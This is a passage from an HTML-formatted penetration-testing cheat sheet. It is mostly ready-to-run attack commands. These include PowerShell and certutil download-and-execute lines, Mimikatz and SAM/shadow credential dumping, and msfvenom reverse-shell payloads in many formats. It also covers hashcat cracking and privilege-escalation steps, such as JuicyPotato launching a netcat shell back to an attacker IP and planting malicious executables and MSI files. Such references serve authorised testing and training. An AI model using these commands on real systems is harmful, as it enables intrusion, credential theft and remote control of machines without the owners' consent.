framework</h2>\n<pre class=\"language-\"><code class=\"language-\"># Download\ngit clone https://github.com/mhaskar/Octopus/tree/v1.2\n\n# Install requirements\npip install -r requirements.txt\n\n# Usage\n./octopus.py\n\n# Listener (exemple)\nlisten_http <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BIND_IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BIND_PORT</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>HOSTNAME</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>INTERVAL_IN_SECONDS</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>LISTENER_NAME</span><span class=\"token punctuation\">></span></span>\nlisten_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1\n\n# Agent (exemple)\ngenerate_powershell <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>LISTENER_NAME</span><span class=\"token punctuation\">></span></span>\ngenerate_powershell listener_1</code></pre><hr>\n<h2 id=\"compiling-exploits\">Compiling exploits</h2>\n<h3 id=\"for-linux\">For linux</h3>\n<pre class=\"language-\"><code class=\"language-\"># 64 bits\ngcc -o exploit exploit.c\n\n# 32 bits\ngcc -m32 -o exploit exploit.c</code></pre><h3 id=\"for-windows\">For windows</h3>\n<pre class=\"language-\"><code class=\"language-\">To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE.exe</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE.c</span><span class=\"token punctuation\">></span></span>\nTo compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE.exe</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE.c</span><span class=\"token punctuation\">></span></span>\nTo Compiled .cpp source file, execute i586-mingw32msvc-g++ -o <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span>.exe <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span>.cpp\nTo compile python scripts, pyinstaller --onefile <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SCRIPT.py</span><span class=\"token punctuation\">></span></span>\n\n# Compile windows .exe on Linux\ni586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></pre><h3 id=\"cross-compile\">Cross compile</h3>\n<pre class=\"language-\"><code class=\"language-\">gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c</code></pre><hr>\n<h2 id=\"dictionary-generation\">DICTIONARY GENERATION</h2>\n<pre class=\"language-\"><code class=\"language-\">cewl -m <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>WORDS_SIZE</span><span class=\"token punctuation\">></span></span> --with-numbers -w dictiFromWebsite <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> -d <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DEPTH</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-\"><code class=\"language-\">crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt</code></pre><hr>\n<h2 id=\"file-transfer\">FILE TRANSFER</h2>\n<h3 id=\"linux-1\">Linux</h3>\n<pre class=\"language-\"><code class=\"language-\"># PYTHON\npython -m SimpleHTTPServer <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\npython2.7 -c \"from urllib import urlretrieve; urlretrieve('<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>', '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DESTINATION_FILE</span><span class=\"token punctuation\">></span></span>')\"\n\n# FTP\nsudo python3 -m pyftpdlib  -p 21 -w\n\n# SMB\nsudo smbserver.py -smb2support liodeus .\n\n# WGET\nwget <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> -o <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>OUT_FILE</span><span class=\"token punctuation\">></span></span>\n\n# CURL\ncurl <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> -o <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>OUT_FILE</span><span class=\"token punctuation\">></span></span>\n\n# NETCAT\nnc -lvp 1234 > <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>OUT_FILE</span><span class=\"token punctuation\">></span></span> \nnc <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> 1234 &lt; <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IN_FILE</span><span class=\"token punctuation\">></span></span> \n\n# SCP\nscp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SOURCE_FILE</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DESTINATION_FILE</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"windows-1\">Windows</h3>\n<pre class=\"language-\"><code class=\"language-\"># FTP \necho open <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span> >> ftp.txt echo bye>> ftp.txt\nftp -v -n -s:ftp.txt\n\n# SMB\ncopy \\\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PATH</span><span class=\"token punctuation\">></span></span>\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span> # Linux -> Windows\ncopy <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span> \\\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PATH</span><span class=\"token punctuation\">></span></span>\\ # Windows -> Linux\n\n# Powershell\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>', '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DESTINATION_FILE</span><span class=\"token punctuation\">></span></span>')\npowershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>')\npowershell \"wget <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>\"\n\n# Python\npython.exe -c \"from urllib import urlretrieve; urlretrieve('<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>', '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DESTINATION_FILE</span><span class=\"token punctuation\">></span></span>')\"\n\n# CertUtil\ncertutil.exe -urlcache -split -f \"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>\"\n\n# NETCAT\nnc -lvp 1234 > <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>OUT_FILE</span><span class=\"token punctuation\">></span></span> \nnc <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> 1234 &lt; <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IN_FILE</span><span class=\"token punctuation\">></span></span>\n\n# CURL\ncurl <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span> -o <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>OUT_FILE</span><span class=\"token punctuation\">></span></span></code></pre><hr>\n<h2 id=\"git\">GIT</h2>\n<h3 id=\"download-git\">Download .git</h3>\n<pre class=\"language-\"><code class=\"language-\">mkdir <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DESTINATION_FOLDER</span><span class=\"token punctuation\">></span></span>\n./gitdumper.sh <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>/.git/ <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DESTINATION_FOLDER</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"extract-git-content\">Extract .git content</h3>\n<pre class=\"language-\"><code class=\"language-\">mkdir <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>EXTRACT_FOLDER</span><span class=\"token punctuation\">></span></span>\n./extractor.sh <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DESTINATION_FOLDER</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>EXTRACT_FOLDER</span><span class=\"token punctuation\">></span></span></code></pre><hr>\n<h2 id=\"hashes\">HASHES</h2>\n<h3 id=\"windows-2\">Windows</h3>\n<pre class=\"language-\"><code class=\"language-\">reg save HKLM\\SAM c:\\SAM\nreg save HKLM\\System c:\\System\n\nsamdump2 System SAM > hashes</code></pre><h3 id=\"linux-2\">Linux</h3>\n<pre class=\"language-\"><code class=\"language-\">unshadow passwd shadow > hashes</code></pre><hr>\n<h2 id=\"mimikatz\">MIMIKATZ</h2>\n<pre class=\"language-\"><code class=\"language-\">privilege::debug</code></pre><pre class=\"language-\"><code class=\"language-\">sekurlsa::logonpasswords\nsekurlsa::tickets /export\n\nkerberos::list /export\n\nvault::cred\nvault::list\n\nlsadump::sam\nlsadump::secrets\nlsadump::cache</code></pre><hr>\n<h2 id=\"miscellaneous\">MISCELLANEOUS</h2>\n<h3 id=\"get-a-windows-path-without-spaces\">Get a Windows path without spaces</h3>\n<pre class=\"language-\"><code class=\"language-\"># path.cmd\n@echo off\necho %~s1\n\npath.cmd \"C:\\Program Files (x86)\\Common Files\\test.txt\"\nC:\\PROGRA~2\\COMMON~1\\test.txt -> Valid path without spaces</code></pre><hr>\n<h2 id=\"msfvenom-payload\">MSFVENOM PAYLOAD</h2>\n<h3 id=\"linux-3\">Linux</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p linux/x86/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f elf > shell.elf</code></pre><h3 id=\"windows-3\">Windows</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f exe > shell.exe</code></pre><h3 id=\"php\">PHP</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p php/reverse_php LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f raw > shell.php\n\nThen we need to add the <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>?php</span> <span class=\"token attr-name\">at</span> <span class=\"token attr-name\">the</span> <span class=\"token attr-name\">first</span> <span class=\"token attr-name\">line</span> <span class=\"token attr-name\">of</span> <span class=\"token attr-name\">the</span> <span class=\"token attr-name\">file</span> <span class=\"token attr-name\">so</span> <span class=\"token attr-name\">that</span> <span class=\"token attr-name\">it</span> <span class=\"token attr-name\">will</span> <span class=\"token attr-name\">execute</span> <span class=\"token attr-name\">as</span> <span class=\"token attr-name\">a</span> <span class=\"token attr-name\">PHP</span> <span class=\"token attr-name\">webpage</span>\n<span class=\"token attr-name\">cat</span> <span class=\"token attr-name\">shell.php</span> <span class=\"token attr-name\">|</span> <span class=\"token attr-name\">pbcopy</span> <span class=\"token attr-name\">&amp;&amp;</span> <span class=\"token attr-name\">echo</span> <span class=\"token attr-name\">'&lt;?php</span> <span class=\"token attr-name\">'</span> <span class=\"token attr-name\">|</span> <span class=\"token attr-name\">tr</span> <span class=\"token attr-name\">-d</span> <span class=\"token attr-name\">'\\n'</span> <span class=\"token punctuation\">></span></span> shell.php &amp;&amp; pbpaste >> shell.php</code></pre><h3 id=\"asp\">ASP</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f asp > shell.asp</code></pre><h3 id=\"jsp\">JSP</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f raw > shell.jsp</code></pre><h3 id=\"war\">WAR</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f war > shell.war</code></pre><h3 id=\"python\">Python</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p cmd/unix/reverse_python LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f raw > shell.py</code></pre><h3 id=\"bash\">Bash</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p cmd/unix/reverse_bash LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f raw > shell.sh</code></pre><h3 id=\"perl\">Perl</h3>\n<pre class=\"language-\"><code class=\"language-\">msfvenom -p cmd/unix/reverse_perl LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f raw > shell.pl</code></pre><h3 id=\"listener\">Listener</h3>\n<h4 id=\"metasploit\">Metasploit</h4>\n<pre class=\"language-\"><code class=\"language-\">use exploit/multi/handler\nset PAYLOAD <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PAYLOAD</span><span class=\"token punctuation\">></span></span>\nset LHOST <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>LHOST</span><span class=\"token punctuation\">></span></span>\nset LPORT <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>LPORT</span><span class=\"token punctuation\">></span></span>\nset ExitOnSession false\nexploit -j -z</code></pre><h4 id=\"netcat\">Netcat</h4>\n<pre class=\"language-\"><code class=\"language-\">nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span></code></pre><hr>\n<h2 id=\"password-cracking\">PASSWORD CRACKING</h2>\n<h3 id=\"online\">Online</h3>\n<pre class=\"language-\"><code class=\"language-\">Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes\nhttps://hashes.com/en/decrypt/hash</code></pre><h3 id=\"hashcat\">Hashcat</h3>\n<h4 id=\"linux-password\">Linux password</h4>\n<pre class=\"language-\"><code class=\"language-\">hashcat -m 1800 -a 0 hash.txt rockyou.txt\nhashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule</code></pre><h4 id=\"windows-password\">Windows password</h4>\n<pre class=\"language-\"><code class=\"language-\">hashcat -m 1000 -a 0 hash.txt rockyou.txt\nhashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule</code></pre><h4 id=\"others\">Others</h4>\n<pre class=\"language-\"><code class=\"language-\">hashcat --example-hashes | grep -i '<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>BEGINNING_OF_HASH</span><span class=\"token punctuation\">></span></span>'</code></pre><h4 id=\"rules\">Rules</h4>\n<pre class=\"language-\"><code class=\"language-\">https://github.com/NotSoSecure/password_cracking_rules</code></pre><h3 id=\"john\">John</h3>\n<pre class=\"language-\"><code class=\"language-\">john --wordlist=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> hash.txt</code></pre><hr>\n<h2 id=\"pivoting\">PIVOTING</h2>\n<h3 id=\"sshuttle\">Sshuttle</h3>\n<pre class=\"language-\"><code class=\"language-\">sshuttle <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP_OF_THE_INTERFACE</span><span class=\"token punctuation\">></span></span>/CIDR</code></pre><h3 id=\"proxychains\">Proxychains</h3>\n<pre class=\"language-\"><code class=\"language-\">ssh -f -N -D 9050 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span>@<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nproxychains <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>COMMAND</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"interesting-link\">Interesting link</h3>\n<pre class=\"language-\"><code class=\"language-\">https://artkond.com/2017/03/23/pivoting-guide/</code></pre><hr>\n<h2 id=\"privile-escalation\">PRIVILE ESCALATION</h2>\n<h3 id=\"linux-4\">Linux</h3>\n<h4 id=\"enumeration-scripts\">Enumeration scripts</h4>\n<pre class=\"language-\"><code class=\"language-\">bash LinEnum.sh\nbash lse.sh -l 1\nbash linpeas.sh\npython linuxprivchecker.py\n./unix-privesc-check standard</code></pre><h4 id=\"vulnerability-scan\">Vulnerability scan</h4>\n<pre class=\"language-\"><code class=\"language-\">perl les2.pl\nbash les.sh</code></pre><h4 id=\"suid-checker\">Suid checker</h4>\n<pre class=\"language-\"><code class=\"language-\">python suid3num.py\n\nhttps://gtfobins.github.io/</code></pre><h4 id=\"methodology-to-follow\">Methodology to follow</h4>\n<pre class=\"language-\"><code class=\"language-\">https://guif.re/linuxeop\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</code></pre><pre class=\"language-\"><code class=\"language-\">sudo -l\nKernel Exploits\nOS Exploits\nPassword reuse (mysql, .bash_history, 000- default.conf...)\nKnown binaries with suid flag and interactive (nmap)\nCustom binaries with suid flag either using other binaries or with command execution\nWritable files owned by root that get executed (cronjobs)\nMySQL as root\nVulnerable services (chkrootkit, logrotate)\nWritable /etc/passwd\nReadable .bash_history\nSSH private key\nListening ports on localhost\n/etc/fstab\n/etc/exports\n/var/mail\nProcess as other user (root) executing something you have permissions to modify\nSSH public key + Predictable PRNG\napt update hooking (PreInvoke)</code></pre><h3 id=\"windows-4\">Windows</h3>\n<h4 id=\"enumeration-scripts-1\">Enumeration scripts</h4>\n<h5 id=\"general-scans\">General scans</h5>\n<pre class=\"language-\"><code class=\"language-\">winPEAS.exe\nwindows-privesc-check2.exe\nSeatbelt.exe -group=all\npowershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\nPowerless.bat\nwinPEAS.bat</code></pre><h5 id=\"search-for-cve\">Search for CVE</h5>\n<pre class=\"language-\"><code class=\"language-\">systeminfo > systeminfo.txt\npython windows-exploit-suggester.py --update\npython windows-exploit-suggester.py --database <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>DATE</span><span class=\"token punctuation\">></span></span>-mssb.xlsx --systeminfo systeminfo.txt\n\nsysteminfo > systeminfo.txt\nwmic qfe > qfe.txt\npython wes.py -u\npython wes.py systeminfo.txt qfe.txt\n\npowershell -exec bypass -command \"&amp; { Import-Module .\\Sherlock.ps1; Find-AllVulns; }\"</code></pre><h5 id=\"post-exploitation\">Post exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\">lazagne.exe all\nSharpWeb.exe\nmimikatz.exe</code></pre><h4 id=\"juicypotato-seimpersonate-or-seassignprimarytoken\">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</h4>\n<pre class=\"language-\"><code class=\"language-\">If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.\n\nJuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c nc.exe <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -e c:\\windows\\system32\\cmd.exe\" -t *\nJuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c nc.exe <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -e c:\\windows\\system32\\cmd.exe\" -t * -c <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>CLSID</span><span class=\"token punctuation\">></span></span>\n\n# CLSID\nhttps://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</code></pre><h4 id=\"methodology-to-follow-1\">Methodology to follow</h4>\n<pre class=\"language-\"><code class=\"language-\">https://guif.re/windowseop\nhttps://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\nhttps://mysecurityjournal.blogspot.com/p/client-side-attacks.html\nhttp://www.fuzzysecurity.com/tutorials/16.html\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</code></pre><h4 id=\"autorun\">Autorun</h4>\n<h5 id=\"detection\">Detection</h5>\n<pre class=\"language-\"><code class=\"language-\">powershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking for modifiable registry autoruns and configs...\n\nKey            : HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\My Program\nPath           : \"C:\\Program Files\\Autorun Program\\program.exe\"\nModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\\Program Files\\Autorun Program\\program.exe; IdentityReference=Everyone}</code></pre><p>or</p>\n<pre class=\"language-\"><code class=\"language-\">winPEAS.exe\n\n[+] Autorun Applications(T1010)\n    Folder: C:\\Program Files\\Autorun Program\n    File: C:\\Program Files\\Autorun Program\\program.exe\n    FilePerms: Everyone [AllAccess]</code></pre><h5 id=\"exploitation\">Exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nmsfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f exe > program.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Victim\ncd C:\\Program Files\\Autorun Program\\\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/program.exe', '.\\program.exe')\n\nTo execute it with elevated privileges we need to wait for someone in the Admin group to login.</code></pre><h4 id=\"alwaysinstallelevated\">AlwaysInstallElevated</h4>\n<h5 id=\"detection-1\">Detection</h5>\n<pre class=\"language-\"><code class=\"language-\">powershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking for AlwaysInstallElevated registry key...\n\nAbuseFunction : Write-UserAddMSI</code></pre><p>or</p>\n<pre class=\"language-\"><code class=\"language-\">reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n\nIf both values are equal to 1 then it's vulnerable.</code></pre><p>or</p>\n<pre class=\"language-\"><code class=\"language-\">winPEAS.exe\n\n[+] Checking AlwaysInstallElevated(T1012)\n\n  AlwaysInstallElevated set to 1 in HKLM!\n  AlwaysInstallElevated set to 1 in HKCU!</code></pre><h5 id=\"exploitation-1\">Exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nmsfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f msi > program.msi\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/program.msi', 'C:\\Temp\\program.msi')\nmsiexec /quiet /qn /i C:\\Temp\\program.msi</code></pre><h4 id=\"executable-files\">Executable Files</h4>\n<h5 id=\"detection-2\">Detection</h5>\n<pre class=\"language-\"><code class=\"language-\">powershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking service executable and argument permissions...\n\nServiceName                     : filepermsvc\nPath                            : \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\nModifiableFile                  : C:\\Program Files\\File Permissions Service\\filepermservice.exe\nModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}\nModifiableFileIdentityReference : Everyone\nStartName                       : LocalSystem\nAbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'\nCanRestart                      : True</code></pre><p>or</p>\n<pre class=\"language-\"><code class=\"language-\">winPEAS.exe\n\n[+] 